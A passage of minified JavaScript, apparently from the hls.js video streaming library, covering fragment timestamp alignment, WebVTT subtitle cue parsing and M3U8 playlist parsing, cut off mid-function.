                            a = n.startPTS; if (Object(Ze.isFiniteNumber)(a)) r > t ? (i.duration = a - i.start, i.duration < 0 && et.logger.warn("negative duration computed for frag " + i.sn + ",level " + i.level + ", there should be some duration drift between playlist and fragment!")) : (n.duration = i.start - a, n.duration < 0 && et.logger.warn("negative duration computed for frag " + n.sn + ",level " + n.level + ", there should be some duration drift between playlist and fragment!"));
                        else if (r > t) { var s = i.cc === n.cc;
                            n.start = i.start + (s && i.minEndPTS ? i.minEndPTS - i.start : i.duration) } else n.start = Math.max(i.start - n.duration, 0) }

                    function E(e, t, r, i, n, a) { var s = r,
                            o = i; if (Object(Ze.isFiniteNumber)(t.startPTS)) { var l = Math.abs(t.startPTS - r);
                            Object(Ze.isFiniteNumber)(t.deltaPTS) ? t.deltaPTS = Math.max(l, t.deltaPTS) : t.deltaPTS = l, s = Math.max(r, t.startPTS), r = Math.min(r, t.startPTS), o = Math.min(i, t.endPTS), i = Math.max(i, t.endPTS), n = Math.min(n, t.startDTS), a = Math.max(a, t.endDTS) } var u = r - t.start;
                        t.start = t.startPTS = r, t.maxStartPTS = s, t.endPTS = i, t.minEndPTS = o, t.startDTS = n, t.endDTS = a, t.duration = i - r; var c = t.sn; if (!e || c < e.startSN || c > e.endSN) return 0; var d, f, h; for (d = c - e.startSN, f = e.fragments, f[d] = t, h = d; h > 0; h--) _(f, h, h - 1); for (h = d; h < f.length - 1; h++) _(f, h, h + 1); return e.PTSKnown = !0, u }

                    function S(e, t) { t.initSegment && e.initSegment && (t.initSegment = e.initSegment); var r, i = 0; if (w(e, t, function(e, n) { i = e.cc - n.cc, Object(Ze.isFiniteNumber)(e.startPTS) && (n.start = n.startPTS = e.startPTS, n.endPTS = e.endPTS, n.duration = e.duration, n.backtracked = e.backtracked, n.dropped = e.dropped, r = n), t.PTSKnown = !0 }), t.PTSKnown) { if (i) { et.logger.log("discontinuity sliding from playlist, take drift into account"); for (var n = t.fragments, a = 0; a < n.length; a++) n[a].cc += i }
                            r ? E(t, r, r.startPTS, r.endPTS, r.startDTS, r.endDTS) : A(e, t), t.PTSKnown = e.PTSKnown } }

                    function T(e, t, r) { void 0 === r && (r = 0); var i = -1;
                        w(e, t, function(e, t, r) { t.start = e.start, i = r }); var n = t.fragments; if (i < 0) return void n.forEach(function(e) { e.start += r }); for (var a = i + 1; a < n.length; a++) n[a].start = n[a - 1].start + n[a - 1].duration }

                    function w(e, t, r) { if (e && t)
                            for (var i = Math.max(e.startSN, t.startSN) - t.startSN, n = Math.min(e.endSN, t.endSN) - t.startSN, a = t.startSN - e.startSN, s = i; s <= n; s++) { var o = e.fragments[a + s],
                                    l = t.fragments[s]; if (!o || !l) break;
                                r(o, l, s) } }

                    function A(e, t) { var r = t.startSN - e.startSN,
                            i = e.fragments,
                            n = t.fragments; if (!(r < 0 || r > i.length))
                            for (var a = 0; a < n.length; a++) n[a].start += i[r].start }

                    function R(e, t, r) { var i = 1e3 * (t.averagetargetduration ? t.averagetargetduration : t.targetduration),
                            n = i / 2; return e && t.endSN === e.endSN && (i = n), r && (i = Math.max(n, i - (window.performance.now() - r))), Math.round(i) }

                    function P(e, t) { for (var r = null, i = 0; i < e.length; i += 1) { var n = e[i]; if (n && n.cc === t) { r = n; break } } return r }

                    function k(e, t) { return Ot.search(e, function(e) { return e.cc < t ? 1 : e.cc > t ? -1 : 0 }) }

                    function D(e, t, r) { var i = !1; return t && t.details && r && (r.endCC > r.startCC || e && e.cc < r.startCC) && (i = !0), i }

                    function L(e, t) { var r = e.fragments,
                            i = t.fragments; if (!i.length || !r.length) return void et.logger.log("No fragments to align"); var n = P(r, i[0].cc); return !n || n && !n.startPTS ? void et.logger.log("No frag in previous level to align on") : n }

                    function C(e, t) { t.fragments.forEach(function(t) { if (t) { var r = t.start + e;
                                t.start = t.startPTS = r, t.endPTS = r + t.duration } }), t.PTSKnown = !0 }

                    function I(e, t, r) { O(e, r, t), !r.PTSKnown && t && M(r, t.details) }

                    function O(e, t, r) { if (D(e, r, t)) { var i = L(r.details, t);
                            i && (et.logger.log("Adjusting PTS using last level due to CC increase within current level"), C(i.start, t)) } }

                    function M(e, t) { if (t && t.fragments.length) { if (!e.hasProgramDateTime || !t.hasProgramDateTime) return; var r = t.fragments[0].programDateTime,
                                i = e.fragments[0].programDateTime,
                                n = (i - r) / 1e3 + t.fragments[0].start;
                            Object(Ze.isFiniteNumber)(n) && (et.logger.log("adjusting PTS using programDateTime delta, sliding:" + n.toFixed(3)), C(n, e)) } }

                    function x(e, t, r) { if (null === t || !Array.isArray(e) || !e.length || !Object(Ze.isFiniteNumber)(t)) return null; if (t < (e[0].programDateTime || 0)) return null; if (t >= (e[e.length - 1].endProgramDateTime || 0)) return null;
                        r = r || 0; for (var i = 0; i < e.length; ++i) { var n = e[i]; if (B(t, r, n)) return n } return null }

                    function N(e, t, r, i) { void 0 === r && (r = 0), void 0 === i && (i = 0); var n = null; if (e ? n = t[e.sn - t[0].sn + 1] : 0 === r && 0 === t[0].start && (n = t[0]), n && 0 === F(r, i, n)) return n; var a = Ot.search(t, F.bind(null, r, i)); return a || n }

                    function F(e, t, r) { void 0 === e && (e = 0), void 0 === t && (t = 0); var i = Math.min(t, r.duration + (r.deltaPTS ? r.deltaPTS : 0)); return r.start + r.duration - i <= e ? 1 : r.start - i > e && r.start ? -1 : 0 }

                    function B(e, t, r) { var i = 1e3 * Math.min(t, r.duration + (r.deltaPTS ? r.deltaPTS : 0)); return (r.endProgramDateTime || 0) - i > e }

                    function U(e) { if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return e }

                    function j(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function G(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function K(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function q(e, t, r) { return t && K(e.prototype, t), r && K(e, r), e }

                    function H(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function V(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function W(e, t, r) { return t && V(e.prototype, t), r && V(e, r), e }

                    function z(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function Y(e, t) { var r; try { r = new Event("addtrack") } catch (e) { r = document.createEvent("Event"), r.initEvent("addtrack", !1, !1) }
                        r.track = e, t.dispatchEvent(r) }

                    function X(e) { if (null === e || void 0 === e ? void 0 : e.cues)
                            for (; e.cues.length > 0;) e.removeCue(e.cues[0]) }

                    function J(e, t) { if (t < e[0].endTime) return e[0]; if (t > e[e.length - 1].endTime) return e[e.length - 1]; for (var r = 0, i = e.length - 1; r <= i;) { var n = Math.floor((i + r) / 2); if (t < e[n].endTime) i = n - 1;
                            else { if (!(t > e[n].endTime)) return e[n];
                                r = n + 1 } } return e[r].endTime - t < t - e[i].endTime ? e[r] : e[i] }

                    function Q(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function Z() { var e = m(); if (!e) return !1; var t = self.SourceBuffer || self.WebKitSourceBuffer,
                            r = e && "function" == typeof e.isTypeSupported && e.isTypeSupported('video/mp4; codecs="avc1.42E01E,mp4a.40.2"'),
                            i = !t || t.prototype && "function" == typeof t.prototype.appendBuffer && "function" == typeof t.prototype.remove; return !!r && !!i }

                    function $(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function ee(e, t, r) { return t && $(e.prototype, t), r && $(e, r), e }

                    function te(e) { if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return e }

                    function re(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function ie(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function ne(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function ae(e, t, r) { return t && ne(e.prototype, t), r && ne(e, r), e }

                    function se(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function oe(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function le(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function ue(e, t, r) { return t && le(e.prototype, t), r && le(e, r), e }

                    function ce(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function de(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function fe(e, t, r) { return t && de(e.prototype, t), r && de(e, r), e }

                    function he(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function ge() { this.window = window, this.state = "INITIAL", this.buffer = "", this.decoder = new kr, this.regionList = [] }

                    function pe(e) {
                        function t(e, t, r, i) { return 3600 * (0 | e) + 60 * (0 | t) + (0 | r) + (0 | i) / 1e3 } var r = e.match(/^(\d+):(\d{2})(:\d{2})?\.(\d{3})/); return r ? r[3] ? t(r[1], r[2], r[3].replace(":", ""), r[4]) : r[1] > 59 ? t(r[1], r[2], 0, r[4]) : t(0, r[1], r[2], r[4]) : null }

                    function ve() { this.values = Object.create(null) }

                    function me(e, t, r, i) { var n = i ? e.split(i) : [e]; for (var a in n)
                            if ("string" == typeof n[a]) { var s = n[a].split(r); if (2 === s.length) { var o = s[0],
                                        l = s[1];
                                    t(o, l) } } }

                    function ye(e, t, r) {
                        function i() { var t = pe(e); if (null === t) throw new Error("Malformed timestamp: " + a); return e = e.replace(/^[^\sa-zA-Z-]+/, ""), t }

                        function n() { e = e.replace(/^\s+/, "") } var a = e; if (n(), t.startTime = i(), n(), "--\x3e" !== e.substr(0, 3)) throw new Error("Malformed time stamp (time stamps must be separated by '--\x3e'): " + a);
                        e = e.substr(3), n(), t.endTime = i(), n(),
                            function(e, t) { var i = new ve;
                                me(e, function(e, t) { switch (e) {
                                        case "region":
                                            for (var n = r.length - 1; n >= 0; n--)
                                                if (r[n].id === t) { i.set(e, r[n].region); break }
                                            break;
                                        case "vertical":
                                            i.alt(e, t, ["rl", "lr"]); break;
                                        case "line":
                                            var a = t.split(","),
                                                s = a[0];
                                            i.integer(e, s), i.percent(e, s) && i.set("snapToLines", !1), i.alt(e, s, ["auto"]), 2 === a.length && i.alt("lineAlign", a[1], ["start", Lr, "end"]); break;
                                        case "position":
                                            a = t.split(","), i.percent(e, a[0]), 2 === a.length && i.alt("positionAlign", a[1], ["start", Lr, "end", "line-left", "line-right", "auto"]); break;
                                        case "size":
                                            i.percent(e, t); break;
                                        case "align":
                                            i.alt(e, t, ["start", Lr, "end", "left", "right"]) } }, /:/, /\s/), t.region = i.get("region", null), t.vertical = i.get("vertical", ""); var n = i.get("line", "auto"); "auto" === n && -1 === Dr.line && (n = -1), t.line = n, t.lineAlign = i.get("lineAlign", "start"), t.snapToLines = i.get("snapToLines", !0), t.size = i.get("size", 100), t.align = i.get("align", Lr); var a = i.get("position", "auto"); "auto" === a && 50 === Dr.position && (a = "start" === t.align || "left" === t.align ? 0 : "end" === t.align || "right" === t.align ? 100 : 50), t.position = a }(e, t) }

                    function be(e) { return e.replace(/<br(?: \/)?>/gi, "\n") }

                    function _e(e, t, r, i) { for (var n, a, s, o, l, u = [], c = window.VTTCue || TextTrackCue, d = 0; d < i.rows.length; d++)
                            if (n = i.rows[d], s = !0, o = 0, l = "", !n.isEmpty()) { for (var f = 0; f < n.chars.length; f++) n.chars[f].uchar.match(/\s/) && s ? o++ : (l += n.chars[f].uchar, s = !1);
                                n.cueStartTime = t, t === r && (r += 1e-4), a = new c(t, r, be(l.trim())), o >= 16 ? o-- : o++, navigator.userAgent.match(/Firefox\//) ? a.line = d + 1 : a.line = d > 7 ? d - 2 : d + 1, a.align = "left", a.position = Math.max(0, Math.min(100, o / 32 * 100)), u.push(a), e && e.addCue(a) }
                        return u }

                    function Ee(e, t, r) { r.a = e, r.b = t }

                    function Se(e, t, r) { return r.a === e && r.b === t }

                    function Te() { return { a: null, b: null } }

                    function we(e) { if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return e }

                    function Ae(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function Re(e, t) { return e && e.label === t.name && !(e.textTrack1 || e.textTrack2) }

                    function Pe(e, t, r, i) { return Math.min(t, i) - Math.max(e, r) }

                    function ke() { return { ccOffset: 0, presentationOffset: 0, 0: { start: 0, prevCC: -1, new: !1 } } }

                    function De(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function Le(e, t, r) { return t && De(e.prototype, t), r && De(e, r), e }

                    function Ce(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function Ie(e) { for (var t = [], r = 0; r < e.length; r++) { var i = e[r]; "subtitles" === i.kind && i.label && t.push(e[r]) } return t }

                    function Oe(e) { if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return e }

                    function Me(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function xe(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function Ne(e, t, r) { return t && xe(e.prototype, t), r && xe(e, r), e }

                    function Fe(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function Be(e, t) { var r = Object.keys(e); if (Object.getOwnPropertySymbols) { var i = Object.getOwnPropertySymbols(e);
                            t && (i = i.filter(function(t) { return Object.getOwnPropertyDescriptor(e, t).enumerable })), r.push.apply(r, i) } return r }

                    function Ue(e) { for (var t = 1; t < arguments.length; t++) { var r = null != arguments[t] ? arguments[t] : {};
                            t % 2 ? Be(Object(r), !0).forEach(function(t) { je(e, t, r[t]) }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : Be(Object(r)).forEach(function(t) { Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t)) }) } return e }

                    function je(e, t, r) { return t in e ? Object.defineProperty(e, t, { value: r, enumerable: !0, configurable: !0, writable: !0 }) : e[t] = r, e }

                    function Ge(e, t) { var r = Object.keys(e); if (Object.getOwnPropertySymbols) { var i = Object.getOwnPropertySymbols(e);
                            t && (i = i.filter(function(t) { return Object.getOwnPropertyDescriptor(e, t).enumerable })), r.push.apply(r, i) } return r }

                    function Ke(e) { for (var t = 1; t < arguments.length; t++) { var r = null != arguments[t] ? arguments[t] : {};
                            t % 2 ? Ge(Object(r), !0).forEach(function(t) { qe(e, t, r[t]) }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : Ge(Object(r)).forEach(function(t) { Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t)) }) } return e }

                    function qe(e, t, r) { return t in e ? Object.defineProperty(e, t, { value: r, enumerable: !0, configurable: !0, writable: !0 }) : e[t] = r, e }

                    function He(e) { if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return e }

                    function Ve(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function We(e, t, r) { return t && Ve(e.prototype, t), r && Ve(e, r), e }

                    function ze(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }
                    r.r(t), r.d(t, "default", function() { return bi }); var Ye = {};
                    r.r(Ye), r.d(Ye, "newCue", function() { return _e }); var Xe, Je = r("./node_modules/url-toolkit/src/url-toolkit.js"),
                        Qe = r("./src/errors.ts"),
                        Ze = r("./src/polyfills/number.js"),
                        $e = r("./src/events.js"),
                        et = r("./src/utils/logger.js"),
                        tt = { hlsEventGeneric: !0, hlsHandlerDestroying: !0, hlsHandlerDestroyed: !0 },
                        rt = function() {
                            function e(e) { this.hls = void 0, this.handledEvents = void 0, this.useGenericHandler = void 0, this.hls = e, this.onEvent = this.onEvent.bind(this); for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), i = 1; i < t; i++) r[i - 1] = arguments[i];
                                this.handledEvents = r, this.useGenericHandler = !0, this.registerListeners() } var t = e.prototype; return t.destroy = function() { this.onHandlerDestroying(), this.unregisterListeners(), this.onHandlerDestroyed() }, t.onHandlerDestroying = function() {}, t.onHandlerDestroyed = function() {}, t.isEventHandler = function() { return "object" == typeof this.handledEvents && this.handledEvents.length && "function" == typeof this.onEvent }, t.registerListeners = function() { this.isEventHandler() && this.handledEvents.forEach(function(e) { if (tt[e]) throw new Error("Forbidden event-name: " + e);
                                    this.hls.on(e, this.onEvent) }, this) }, t.unregisterListeners = function() { this.isEventHandler() && this.handledEvents.forEach(function(e) { this.hls.off(e, this.onEvent) }, this) }, t.onEvent = function(e, t) { this.onEventGeneric(e, t) }, t.onEventGeneric = function(e, t) { var r = function(e, t) { var r = "on" + e.replace("hls", ""); if ("function" != typeof this[r]) throw new Error("Event " + e + " has no generic handler in this " + this.constructor.name + " class (tried " + r + ")"); return this[r].bind(this, t) }; try { r.call(this, e, t).call() } catch (t) { et.logger.error("An internal error happened while handling event " + e + '. Error message: "' + t.message + '". Here is a stacktrace:', t), this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.OTHER_ERROR, details: Qe.ErrorDetails.INTERNAL_EXCEPTION, fatal: !1, event: e, err: t }) } }, e }(),
                        it = rt;! function(e) { e.MANIFEST = "manifest", e.LEVEL = "level", e.AUDIO_TRACK = "audioTrack", e.SUBTITLE_TRACK = "subtitleTrack" }(Xe || (Xe = {})); var nt;! function(e) { e.MAIN = "main", e.AUDIO = "audio", e.SUBTITLE = "subtitle" }(nt || (nt = {})); var at, st = r("./src/demux/mp4demuxer.js"),
                        ot = function() {
                            function e(e, t) { this._uri = null, this.baseuri = void 0, this.reluri = void 0, this.method = null, this.key = null, this.iv = null, this.baseuri = e, this.reluri = t } return n(e, [{ key: "uri", get: function() { return !this._uri && this.reluri && (this._uri = Object(Je.buildAbsoluteURL)(this.baseuri, this.reluri, { alwaysNormalize: !0 })), this._uri } }]), e }();! function(e) { e.AUDIO = "audio", e.VIDEO = "video" }(at || (at = {})); var lt, ut = function() {
                            function e() { var e;
                                this._url = null, this._byteRange = null, this._decryptdata = null, this._elementaryStreams = (e = {}, e[at.AUDIO] = !1, e[at.VIDEO] = !1, e), this.deltaPTS = 0, this.rawProgramDateTime = null, this.programDateTime = null, this.title = null, this.tagList = [], this.cc = void 0, this.type = void 0, this.relurl = void 0, this.baseurl = void 0, this.duration = void 0, this.start = void 0, this.sn = 0, this.urlId = 0, this.level = 0, this.levelkey = void 0, this.loader = void 0 } var t = e.prototype; return t.setByteRange = function(e, t) { var r = e.split("@", 2),
                                    i = [];
                                1 === r.length ? i[0] = t ? t.byteRangeEndOffset : 0 : i[0] = parseInt(r[1]), i[1] = parseInt(r[0]) + i[0], this._byteRange = i }, t.addElementaryStream = function(e) { this._elementaryStreams[e] = !0 }, t.hasElementaryStream = function(e) { return !0 === this._elementaryStreams[e] }, t.createInitializationVector = function(e) { for (var t = new Uint8Array(16), r = 12; r < 16; r++) t[r] = e >> 8 * (15 - r) & 255; return t }, t.setDecryptDataFromLevelKey = function(e, t) { var r = e; return (null === e || void 0 === e ? void 0 : e.method) && e.uri && !e.iv && (r = new ot(e.baseuri, e.reluri), r.method = e.method, r.iv = this.createInitializationVector(t)), r }, s(e, [{ key: "url", get: function() { return !this._url && this.relurl && (this._url = Object(Je.buildAbsoluteURL)(this.baseurl, this.relurl, { alwaysNormalize: !0 })), this._url }, set: function(e) { this._url = e } }, { key: "byteRange", get: function() { return this._byteRange ? this._byteRange : [] } }, { key: "byteRangeStartOffset", get: function() { return this.byteRange[0] } }, { key: "byteRangeEndOffset", get: function() { return this.byteRange[1] } }, { key: "decryptdata", get: function() { if (!this.levelkey && !this._decryptdata) return null; if (!this._decryptdata && this.levelkey) { var e = this.sn; "number" != typeof e && (this.levelkey && "AES-128" === this.levelkey.method && !this.levelkey.iv && et.logger.warn('missing IV for initialization segment with method="' + this.levelkey.method + '" - compliance issue'), e = 0), this._decryptdata = this.setDecryptDataFromLevelKey(this.levelkey, e) } return this._decryptdata } }, { key: "endProgramDateTime", get: function() { if (null === this.programDateTime) return null; if (!Object(Ze.isFiniteNumber)(this.programDateTime)) return null; var e = Object(Ze.isFiniteNumber)(this.duration) ? this.duration : 0; return this.programDateTime + 1e3 * e } }, { key: "encrypted", get: function() { return !(!this.decryptdata || null === this.decryptdata.uri || null !== this.decryptdata.key) } }]), e }(),
                        ct = function() {
                            function e(e) { this.endCC = 0, this.endSN = 0, this.fragments = [], this.initSegment = null, this.live = !0, this.needSidxRanges = !1, this.startCC = 0, this.startSN = 0, this.startTimeOffset = null, this.targetduration = 0, this.totalduration = 0, this.type = null, this.url = e, this.version = null } return l(e, [{ key: "hasProgramDateTime", get: function() { return !(!this.fragments[0] || !Object(Ze.isFiniteNumber)(this.fragments[0].programDateTime)) } }]), e }(),
                        dt = /^(\d+)x(\d+)$/,
                        ft = /\s*(.+?)\s*=((?:\".*?\")|.*?)(?:,|$)/g,
                        ht = function() {
                            function e(t) { "string" == typeof t && (t = e.parseAttrList(t)); for (var r in t) t.hasOwnProperty(r) && (this[r] = t[r]) } var t = e.prototype; return t.decimalInteger = function(e) { var t = parseInt(this[e], 10); return t > Number.MAX_SAFE_INTEGER ? 1 / 0 : t }, t.hexadecimalInteger = function(e) { if (this[e]) { var t = (this[e] || "0x").slice(2);
                                    t = (1 & t.length ? "0" : "") + t; for (var r = new Uint8Array(t.length / 2), i = 0; i < t.length / 2; i++) r[i] = parseInt(t.slice(2 * i, 2 * i + 2), 16); return r } return null }, t.hexadecimalIntegerAsNumber = function(e) { var t = parseInt(this[e], 16); return t > Number.MAX_SAFE_INTEGER ? 1 / 0 : t }, t.decimalFloatingPoint = function(e) { return parseFloat(this[e]) }, t.enumeratedString = function(e) { return this[e] }, t.decimalResolution = function(e) { var t = dt.exec(this[e]); if (null !== t) return { width: parseInt(t[1], 10), height: parseInt(t[2], 10) } }, e.parseAttrList = function(e) { var t, r = {}; for (ft.lastIndex = 0; null !== (t = ft.exec(e));) { var i = t[2];
                                    0 === i.indexOf('"') && i.lastIndexOf('"') === i.length - 1 && (i = i.slice(1, -1)), r[t[1]] = i } return r }, e }(),
                        gt = ht,
                        pt = { audio: { a3ds: !0, "ac-3": !0, "ac-4": !0, alac: !0, alaw: !0, dra1: !0, "dts+": !0, "dts-": !0, dtsc: !0, dtse: !0, dtsh: !0, "ec-3": !0, enca: !0, g719: !0, g726: !0, m4ae: !0, mha1: !0, mha2: !0, mhm1: !0, mhm2: !0, mlpa: !0, mp4a: !0, "raw ": !0, Opus: !0, samr: !0, sawb: !0, sawp: !0, sevc: !0, sqcp: !0, ssmv: !0, twos: !0, ulaw: !0 }, video: { avc1: !0, avc2: !0, avc3: !0, avc4: !0, avcp: !0, drac: !0, dvav: !0, dvhe: !0, encv: !0, hev1: !0, hvc1: !0, mjp2: !0, mp4v: !0, mvc1: !0, mvc2: !0, mvc3: !0, mvc4: !0, resv: !0, rv60: !0, s263: !0, svc1: !0, svc2: !0, "vc-1": !0, vp08: !0, vp09: !0 } },
                        vt = /(?:#EXT-X-STREAM-INF:([^\n\r]*)[\r\n]+([^\r\n]+)|#EXT-X-SESSION-DATA:([^\n\r]*)[\r\n]+)/g,
                        mt = /#EXT-X-MEDIA:(.*)/g,
                        yt = new RegExp([/#EXTINF:\s*(\d*(?:\.\d+)?)(?:,(.*)\s+)?/.source, /|(?!#)([\S+ ?]+)/.source, /|#EXT-X-BYTERANGE:*(.+)/.source, /|#EXT-X-PROGRAM-DATE-TIME:(.+)/.source, /|#.*/.source].join(""), "g"),
                        bt = /(?:(?:#(EXTM3U))|(?:#EXT-X-(PLAYLIST-TYPE):(.+))|(?:#EXT-X-(MEDIA-SEQUENCE): *(\d+))|(?:#EXT-X-(TARGETDURATION): *(\d+))|(?:#EXT-X-(KEY):(.+))|(?:#EXT-X-(START):(.+))|(?:#EXT-X-(ENDLIST))|(?:#EXT-X-(DISCONTINUITY-SEQ)UENCE:(\d+))|(?:#EXT-X-(DIS)CONTINUITY))|(?:#EXT-X-(VERSION):(\d+))|(?:#EXT-X-(MAP):(.+))|(?:(#)([^:]*):(.*))|(?:(#)(.*))(?:.*)\r?\n?/,
                        _t = /\.(mp4|m4s|m4v|m4a)$/i,
                        Et = function() {
                            function e() {} return e.findGroup = function(e, t) { for (var r = 0; r < e.length; r++) { var i = e[r]; if (i.id === t) return i } }, e.convertAVC1ToAVCOTI = function(e) { var t, r = e.split("."); return r.length > 2 ? (t = r.shift() + ".", t += parseInt(r.shift()).toString(16), t += ("000" + parseInt(r.shift()).toString(16)).substr(-4)) : t = e, t }, e.resolve = function(e, t) { return Je.buildAbsoluteURL(t, e, { alwaysNormalize: !0 }) }, e.parseMasterPlaylist = function(t, r) { var i = [],
                                    n = {},
                                    a = !1;
                                vt.lastIndex = 0; for (var s; null != (s = vt.exec(t));)
                                    if (s[1]) { var o = {},
                                            l = o.attrs = new gt(s[1]);
                                        o.url = e.resolve(s[2], r); var c = l.decimalResolution("RESOLUTION");
                                        c && (o.width = c.width, o.height = c.height), o.bitrate = l.decimalInteger("AVERAGE-BANDWIDTH") || l.decimalInteger("BANDWIDTH"), o.name = l.NAME,
                                            function(e, t) {
                                                ["video", "audio"].forEach(function(r) { var i = e.filter(function(e) { return u(e, r) }); if (i.length) { var n = i.filter(function(e) { return 0 === e.lastIndexOf("avc1", 0) || 0 === e.lastIndexOf("mp4a", 0) });
                                                        t[r + "Codec"] = n.length > 0 ? n[0] : i[0], e = e.filter(function(e) { return -1 === i.indexOf(e) }) } }), t.unknownCodecs = e }([].concat((l.CODECS || "").split(/[ ,]+/)), o), o.videoCodec && -1 !== o.videoCodec.indexOf("avc1") && (o.videoCodec = e.convertAVC1ToAVCOTI(o.videoCodec)), i.push(o) } else if (s[3]) { var d = new gt(s[3]);
                                    d["DATA-ID"] && (a = !0, n[d["DATA-ID"]] = d) } return { levels: i, sessionData: a ? n : null } }, e.parseMasterPlaylistMedia = function(t, r, i, n) { void 0 === n && (n = []); var a, s = [],
                                    o = 0; for (mt.lastIndex = 0; null !== (a = mt.exec(t));) { var l = new gt(a[1]); if (l.TYPE === i) { var u = { attrs: l, id: o++, groupId: l["GROUP-ID"], instreamId: l["INSTREAM-ID"], name: l.NAME || l.LANGUAGE, type: i, default: "YES" === l.DEFAULT, autoselect: "YES" === l.AUTOSELECT, forced: "YES" === l.FORCED, lang: l.LANGUAGE }; if (l.URI && (u.url = e.resolve(l.URI, r)), n.length) { var c = e.findGroup(n, u.groupId);
                                            u.audioCodec = c ? c.codec : n[0].codec }
                                        s.push(u) } } return s }, e.parseLevelPlaylist = function(e, t, r, i, n) { var a, s, o, l = 0,
                                    u = 0,
                                    c = new ct(t),
                                    h = 0,
                                    g = null,
                                    p = new ut,
                                    v = null; for (yt.lastIndex = 0; null !== (a = yt.exec(e));) { var m = a[1]; if (m) { p.duration = parseFloat(m); var y = (" " + a[2]).slice(1);
                                        p.title = y || null, p.tagList.push(y ? ["INF", m, y] : ["INF", m]) } else if (a[3]) { if (Object(Ze.isFiniteNumber)(p.duration)) { var b = l++;
                                            p.type = i, p.start = u, o && (p.levelkey = o), p.sn = b, p.level = r, p.cc = h, p.urlId = n, p.baseurl = t, p.relurl = (" " + a[3]).slice(1), f(p, g), c.fragments.push(p), g = p, u += p.duration, p = new ut } } else if (a[4]) { var _ = (" " + a[4]).slice(1);
                                        g ? p.setByteRange(_, g) : p.setByteRange(_) } else if (a[5]) p.rawProgramDateTime = (" " + a[5]).slice(1), p.tagList.push(["PROGRAM-DATE-TIME", p.rawProgramDateTime]), null === v && (v = c.fragments.length);
                                    else { if (!(a = a[0].match(bt))) { et.logger.warn("No matches on slow regex match for level playlist!"); continue } for (s = 1; s < a.length && void 0 === a[s]; s++); var E = (" " + a[s + 1]).slice(1),
                                            S = (" " + a[s + 2]).slice(1); switch (a[s]) {
                                            case "#":
                                                p.tagList.push(S ? [E, S] : [E]); break;
                                            case "PLAYLIST-TYPE":
                                                c.type = E.toUpperCase(); break;
                                            case "MEDIA-SEQUENCE":
                                                l = c.startSN = parseInt(E); break;
                                            case "TARGETDURATION":
                                                c.targetduration = parseFloat(E); break;
                                            case "VERSION":
                                                c.version = parseInt(E); break;
                                            case "EXTM3U":
                                                break;
                                            case "ENDLIST":
                                                c.live = !1; break;
                                            case "DIS":
                                                h++, p.tagList.push(["DIS"]); break;
                                            case "DISCONTINUITY-SEQ":
                                                h = parseInt(E); break;
                                            case "KEY":
                                                var T = E,
